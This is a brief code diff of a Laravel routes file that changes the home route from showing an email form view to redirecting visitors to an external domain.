@@ -18,7 +18,7 @@ use Illuminate\Support\Facades\Route;
 */
 
 Route::get('/', function () {
-    return view('form-email');
+    return redirect('http://acteeveallthingsfinance.id');
 });
 
 Route::get('auth/verification', VerificationController::class);
